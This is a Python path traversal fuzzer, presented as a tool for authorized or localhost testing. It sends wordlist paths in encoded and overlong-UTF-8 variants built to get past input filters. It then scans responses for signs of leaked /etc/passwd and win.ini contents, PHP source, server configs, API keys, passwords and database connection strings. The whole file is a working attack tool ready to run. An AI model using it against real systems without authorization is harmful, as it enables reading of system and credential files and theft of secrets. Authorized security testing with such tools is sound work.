#!/usr/bin/env python3
"""
Path Traversal Fuzzer — for authorized/localhost testing only
Usage: python3 traversal_fuzzer.py -u http://localhost:3000 -w wordlist.txt
"""

import argparse
import requests
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# ── ANSI colors ────────────────────────────────────────────────────────────────
R = "\033[91m"  # red    → interesting hit
G = "\033[92m"  # green  → confirmed traversal
Y = "\033[93m"  # yellow → potential
C = "\033[96m"  # cyan   → info
W = "\033[0m"   # reset

BANNER = f"""{C}
  ___      _   _       _____                                  _ 
 | _ \__ _| |_| |_    |_   _| _ __ ___ _____ _ _ ___ __ _| |
 |  _/ _` |  _| ' \     | || '_/ _` \ V / -_) '_(_-</ _` | |
 |_| \__,_|\__|_||_|    |_||_| \__,_|\_/\___|_| /__/\__,_|_|
                                                              
  localhost path traversal fuzzer | use responsibly
{W}"""

# ── Encoding variations ────────────────────────────────────────────────────────
def encode_variants(path: str) -> list[str]:
    """Generate multiple encoding variations of a traversal payload."""
    variants = [path]
    
    # URL encode
    variants.append(urllib.parse.quote(path, safe=""))
    # Double URL encode
    variants.append(urllib.parse.quote(urllib.parse.quote(path, safe=""), safe=""))
    # Unicode encode ../
    variants.append(path.replace("../", "%u002e%u002e/"))
    # Mixed slash
    variants.append(path.replace("../", "..\\"))
    # Null byte (for older systems)
    variants.append(path + "%00")
    # 16-bit unicode
    variants.append(path.replace("../", "%c0%ae%c0%ae/"))
    # Overlong UTF-8
    variants.append(path.replace("../", "..%c0%af"))

    return list(dict.fromkeys(variants))  # deduplicate, preserve order


# ── Interesting response detection ─────────────────────────────────────────────
SIGNATURES = [
    "root:x:",           # /etc/passwd
    "[boot loader]",     # win.ini
    "for 16-bit app",    # win.ini
    "\\windows\\",       # windows paths
    "daemon:",           # /etc/passwd
    "nobody:",           # /etc/passwd
    "<?php",             # php source
    "DocumentRoot",      # apache config
    "SSLCertificate",    # ssl config
    "SECRET",
    "API_KEY",
    "password",
    "DB_",
    "NEXT_PUBLIC_",
    "mongodb://",
    "mysql://",
    "postgres://",
]

def is_interesting(response: requests.Response) -> tuple[bool, str]:
    """Check if a response looks like a traversal hit."""
    text = response.text.lower()
    for sig in SIGNATURES:
        if sig.lower() in text:
            return True, sig
    # Unusual content types
    ct = response.headers.get("content-type", "")
    if response.status_code == 200 and "text/plain" in ct:
        return True, "text/plain 200"
    return False, ""


# ── Single request ─────────────────────────────────────────────────────────────
def fuzz_path(base_url: str, path: str, session: requests.Session,
              delay: float, headers: dict, verbose: bool) -> dict | None:
    url = base_url.rstrip("/") + "/" + path.lstrip("/")
    variants = encode_variants(path)
    
    for variant in variants:
        full_url = base_url.rstrip("/") + "/" + variant.lstrip("/")
        try:
            r = session.get(full_url, headers=headers, timeout=8, allow_redirects=False)
            hit, reason = is_interesting(r)
            
            if hit or r.status_code not in (404, 400, 403):
                result = {
                    "url": full_url,
                    "status": r.status_code,
                    "length": len(r.content),
                    "hit": hit,
                    "reason": reason,
                    "snippet": r.text[:120].replace("\n", " "),
                }
                return result
                
            if verbose and r.status_code != 404:
                print(f"  {Y}[{r.status_code}]{W} {full_url}")
                
        except requests.RequestException as e:
            if verbose:
                print(f"  [ERR] {full_url} → {e}")
        
        if delay:
            time.sleep(delay)
    
    return None


# ── Output helpers ─────────────────────────────────────────────────────────────
def print_result(r: dict):
    status = r["status"]
    color = G if r["hit"] else Y
    tag = "HIT" if r["hit"] else f"{status}"
    reason = f" ({r['reason']})" if r["reason"] else ""
    print(f"  {color}[{tag}]{W}{reason} {r['url']}")
    print(f"         length={r['length']}  snippet: {r['snippet'][:80]}")


def save_results(results: list[dict], outfile: str):
    with open(outfile, "w") as f:
        f.write(f"# Path Traversal Fuzzer Results — {datetime.now()}\n\n")
        for r in results:
            f.write(f"[{r['status']}] {r['url']}\n")
            f.write(f"  reason : {r['reason']}\n")
            f.write(f"  snippet: {r['snippet']}\n\n")
    print(f"\n{C}[*] Results saved to {outfile}{W}")


# ── Main ───────────────────────────────────────────────────────────────────────
def main():
    print(BANNER)
    
    parser = argparse.ArgumentParser(
        description="Path traversal fuzzer for localhost / authorized targets"
    )
    parser.add_argument("-u", "--url",      required=True,  help="Base URL e.g. http://localhost:3000")
    parser.add_argument("-w", "--wordlist", required=True,  help="Path to wordlist file")
    parser.add_argument("-t", "--threads",  type=int, default=5, help="Threads (default 5)")
    parser.add_argument("-d", "--delay",    type=float, default=0, help="Delay between requests (s)")
    parser.add_argument("-o", "--output",   default="traversal_results.txt", help="Output file")
    parser.add_argument("-H", "--header",   action="append", default=[], help="Custom header (repeatable): 'Name: Value'")
    parser.add_argument("-v", "--verbose",  action="store_true", help="Verbose output")
    parser.add_argument("--prefix",         default="", help="Prepend prefix to every path e.g. /api/files/")
    args = parser.parse_args()

    # Parse custom headers
    headers = {"User-Agent": "Mozilla/5.0 (PathTraversalFuzzer/1.0)"}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()

    # Load wordlist
    try:
        with open(args.wordlist) as f:
            paths = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    except FileNotFoundError:
        print(f"{R}[!] Wordlist not found: {args.wordlist}{W}")
        sys.exit(1)

    # Apply prefix
    if args.prefix:
        paths = [args.prefix + p for p in paths]

    print(f"{C}[*] Target  : {args.url}{W}")
    print(f"{C}[*] Wordlist: {len(paths)} paths loaded{W}")
    print(f"{C}[*] Threads : {args.threads} | Delay: {args.delay}s{W}")
    print(f"{C}[*] Encoding variants per path: 8{W}\n")

    session = requests.Session()
    results = []

    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        futures = {
            pool.submit(fuzz_path, args.url, p, session, args.delay, headers, args.verbose): p
            for p in paths
        }
        done = 0
        for future in as_completed(futures):
            done += 1
            result = future.result()
            if result:
                results.append(result)
                print_result(result)
            
            # Progress bar
            pct = int(done / len(paths) * 40)
            bar = "█" * pct + "░" * (40 - pct)
            print(f"\r  [{bar}] {done}/{len(paths)}", end="", flush=True)

    print(f"\n\n{G}[✓] Done — {len(results)} interesting responses found{W}")
    
    if results:
        save_results(results, args.output)


if __name__ == "__main__":
    main()
